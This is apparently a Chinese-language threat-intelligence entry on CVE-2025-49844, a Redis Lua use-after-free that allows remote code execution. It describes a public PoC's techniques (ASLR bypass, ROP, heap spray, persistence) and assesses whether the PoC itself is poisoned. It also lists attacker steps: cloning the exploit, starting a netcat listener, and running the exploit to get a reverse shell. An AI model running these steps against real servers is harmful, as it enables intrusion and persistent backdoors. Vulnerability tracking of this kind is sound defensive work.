## CVE-2025-49844 - Redis 远程代码执行 (RCE), 释放后重用 (Use-After-Free, UAF)

**漏洞编号:** CVE-2025-49844

**漏洞类型:** 远程代码执行 (RCE), 释放后重用 (Use-After-Free, UAF)

**影响应用:** Redis

**危害等级:** 严重

**CVSS评分:** 10.0

**影响版本:** Redis < 6.2.20; 7.2.0 ≤ Redis < 7.2.11; 7.4.x before 7.4.6; 8.0.x before 8.0.4; 8.2.x before 8.2.2

**利用条件:** 需要认证，拥有低权限及以上用户权限

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 中

**投毒风险:** 10%

## 详情

该POC代码是一个高度成熟且功能完整的Python利用脚本，用于针对Redis Lua解释器中的释放后重用（Use-After-Free, UAF）漏洞（CVE-2025-49844）。其功能涵盖了现代漏洞利用的多个关键方面，使其成为一个非常可靠的RCE利用工具。首先，该POC通过内存信息泄漏技术成功绕过地址空间布局随机化（ASLR），这是一项常见的操作系统防御机制。其次，它利用面向返回编程（ROP）技术绕过数据执行保护（DEP/NX），使得即使在非可执行内存区域也能执行恶意代码。为了提高利用的可靠性，POC还采用了堆喷射（Heap Spraying）技术，以确保UAF对象在可控的内存位置被创建。该POC支持执行任意Shellcode，能够实现多种攻击目标，包括但不限于建立反向Shell以获取目标系统的交互式控制权，甚至具备建立持久性后门的能力。这意味着一旦利用成功，攻击者不仅能获得临时控制，还能在系统重启后继续保持访问。脚本用Python 3.6+编写，依赖`redis`库，提供友好的命令行接口，使得攻击者可以相对便捷地进行部署和使用。其详细的README文档也进一步证实了其作为完整利用工具的有效性。

**利用步骤**
攻击者可以按照以下步骤利用该POC：
1. **获取代码**: 通过Git命令克隆POC仓库：`git clone https://github.com/Yuri08loveElaina/CVE-2025-49844.git`
2. **进入目录**: 切换到克隆的目录：`cd CVE-2025-49844`
3. **安装依赖**: 使用pip安装所需的Python库：`pip install -r requirements.txt`，通常会包含`redis`。
4. **添加执行权限**: 为主利用脚本添加执行权限：`chmod +x redis-exploit.py`。
5. **前置条件**: 确保攻击者拥有目标Redis服务器的认证凭据（如果需要认证）。
6. **启动监听器 (反向Shell模式)**: 如果目标是获取反向Shell，攻击者需要在自己的机器上启动一个Netcat监听器，例如：`nc -lvnp 4444`。
7. **执行攻击**: 
   *   **基本漏洞检查**: `python3 exploit.py -H <target_host> -p <port> [-a <password>]`
   *   **获取反向Shell**: `python3 exploit.py -H <target_host> -p <port> [-a <password>] -l <your_ip> -P <your_port>`
   攻击脚本将自动执行连接、版本检测、架构识别、堆准备、UAF对象创建、内存泄漏、ROP链构造、Shellcode执行等一系列复杂步骤，最终实现远程代码执行或反向Shell。

**投毒风险分析**
根据提供的POC `README.md` 文件内容，该POC代码的投毒风险评估为低（10%）。主要基于以下几点：
1. **明确的免责声明**: README中清晰地指出该工具仅用于“教育和授权的安全测试目的”，并且作者不对任何滥用或造成的损害负责。这表明其意图是用于合法的安全研究而非恶意传播。
2. **无外部可疑行为**: README中未提及引入外部可疑脚本、二进制文件或进行未经授权的网络通信（除了目标Redis服务器和反向Shell监听器）。所列出的依赖项（`pip install redis`）是标准的、无恶意的Redis客户端库。
3. **“后门”的上下文**: POC中提及的“Establish persistent backdoor access”是其作为完整利用工具的功能之一，意在通过漏洞在**目标系统**上创建持久性访问，而非在**执行POC的攻击者机器**上创建后门。这是漏洞利用的常见目标，不应被误判为POC代码对使用者的投毒行为。
4. **代码可读性与结构**: 尽管没有实际的代码内容，但README的结构和功能描述都非常清晰和专业，符合高质量安全工具的特征，没有暗示任何混淆或隐藏恶意意图的迹象。
综上所述，在没有进一步代码审计的情况下，仅凭这份详尽的README，判断其对使用者本身的投毒风险较低。

**项目地址:** https://github.com/Yuri08loveElaina/CVE-2025-49844.git

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-49844
